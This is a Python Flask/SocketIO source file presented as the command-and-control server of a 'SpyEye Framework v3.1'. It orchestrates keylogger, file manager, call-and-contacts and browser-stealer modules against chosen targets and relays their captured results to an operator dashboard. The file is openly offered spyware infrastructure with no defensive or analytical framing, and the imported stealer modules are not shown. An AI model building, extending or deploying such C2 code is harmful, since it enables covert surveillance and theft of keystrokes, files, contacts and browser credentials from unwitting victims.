"""
app.py

Main Controller & C2 Server for SpyEye Framework v3.1.
  - Flask web server & SocketIO event handling.
  - Target management and module orchestration.
"""

import logging
import os
import time
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit

from config import Config
from modules.keylogger import KeyloggerModule
from modules.file_manager import FileManagerModule
from modules.call_contacts import CallContactsModule
from modules.browser_stealer import BrowserStealerModule

# Configure logging
logging.basicConfig(
    level=getattr(logging, Config.LOG_LEVEL),
    format=Config.LOG_FORMAT,
)
logger = logging.getLogger("SpyEye.App")

app = Flask(__name__)
app.config.from_object(Config)
socketio = SocketIO(app, cors_allowed_origins=Config.SOCKETIO_CORS_ALLOWED_ORIGINS)

# Active module instances tracking dictionary: { "target_id_module_name": module_instance }
active_modules = {}


@app.route('/')
def index():
    """Render the master dashboard interface."""
    return render_template('index.html', framework=Config.FRAMEWORK_NAME, version=Config.FRAMEWORK_VERSION)


@app.route('/api/status', methods=['GET'])
def api_status():
    """Return framework status and active targets summary."""
    return jsonify({
        "status": "online",
        "framework": Config.FRAMEWORK_NAME,
        "version": Config.FRAMEWORK_VERSION,
        "active_modules": list(active_modules.keys())
    })


# ─── SocketIO Event Handlers: Keylogger ──────────────────────────────

@socketio.on('start_keylogger')
def handle_start_keylogger(data):
    """Start keylogger module for a target."""
    target_id = data.get('target_id')
    config_params = data.get('config', {})
    module_key = f"{target_id}_keylogger"

    if module_key in active_modules:
        active_modules[module_key].stop()

    keylogger_module = KeyloggerModule(target_id=target_id, config=config_params)

    def keylogger_callback(result):
        socketio.emit('keylogger_response', result)

    keylogger_module.set_result_callback(keylogger_callback)

    success = keylogger_module.start()
    if success:
        active_modules[module_key] = keylogger_module
        logger.info("[Keylogger] Successfully started for target %s", target_id)
        emit('keylogger_response', {'status': 'started', 'target_id': target_id})
    else:
        emit('keylogger_response', {'status': 'error', 'message': 'Keylogger module failed to start.'})


@socketio.on('stop_keylogger')
def handle_stop_keylogger(data):
    """Stop active keylogger session for a target."""
    target_id = data.get('target_id')
    module_key = f"{target_id}_keylogger"

    if module_key in active_modules:
        active_modules[module_key].stop()
        del active_modules[module_key]
        logger.info("[Keylogger] Stopped and cleaned up for target %s", target_id)
        emit('keylogger_response', {'status': 'stopped', 'target_id': target_id})
    else:
        emit('keylogger_response', {'status': 'not_running', 'message': 'No active keylogger session found.'})


# ─── SocketIO Event Handlers: File Manager ───────────────────────────

@socketio.on('start_file_manager')
def handle_start_file_manager(data):
    target_id = data.get('target_id')
    config_params = data.get('config', {})
    module_key = f"{target_id}_file_manager"

    if module_key in active_modules:
        active_modules[module_key].stop()

    file_manager_module = FileManagerModule(target_id=target_id, config=config_params)
    
    def file_manager_callback(result):
        socketio.emit('file_manager_response', result)

    file_manager_module.set_result_callback(file_manager_callback)
    
    if file_manager_module.validate_config():
        file_manager_module.run()
        emit('file_manager_response', {'status': 'executed', 'target_id': target_id, 'config': config_params})
    else:
        emit('file_manager_response', {'status': 'error', 'message': 'File manager module configuration failed validation.'})


# ─── SocketIO Event Handlers: Call & Contacts ────────────────────────

@socketio.on('start_call_contacts')
def handle_start_call_contacts(data):
    target_id = data.get('target_id')
    config_params = data.get('config', {})
    module_key = f"{target_id}_call_contacts"

    if module_key in active_modules:
        active_modules[module_key].stop()

    call_contacts_module = CallContactsModule(target_id=target_id, config=config_params)
    
    def call_contacts_callback(result):
        socketio.emit('call_contacts_response', result)

    call_contacts_module.set_result_callback(call_contacts_callback)
    
    if call_contacts_module.validate_config():
        call_contacts_module.run()
        emit('call_contacts_response', {'status': 'executed', 'target_id': target_id, 'config': config_params})
    else:
        emit('call_contacts_response', {'status': 'error', 'message': 'Call contacts module configuration failed validation.'})


# ─── SocketIO Event Handlers: Browser Stealer ────────────────────────

@socketio.on('start_browser_stealer')
def handle_start_browser_stealer(data):
    target_id = data.get('target_id')
    config_params = data.get('config', {})
    module_key = f"{target_id}_browser_stealer"

    if module_key in active_modules:
        active_modules[module_key].stop()

    browser_stealer_module = BrowserStealerModule(target_id=target_id, config=config_params)
    
    def browser_stealer_callback(result):
        socketio.emit('browser_stealer_response', result)

    browser_stealer_module.set_result_callback(browser_stealer_callback)
    
    if browser_stealer_module.validate_config():
        browser_stealer_module.run()
        emit('browser_stealer_response', {'status': 'executed', 'target_id': target_id, 'config': config_params})
    else:
        emit('browser_stealer_response', {'status': 'error', 'message': 'Browser stealer module configuration failed validation.'})


# ─── Server Execution Entry Point ────────────────────────────────────

if __name__ == '__main__':
    logger.info("[*] Starting SpyEye Master Controller on %s:%d...", Config.HOST, Config.PORT)
    socketio.run(app, host=Config.HOST, port=Config.PORT, debug=Config.DEBUG)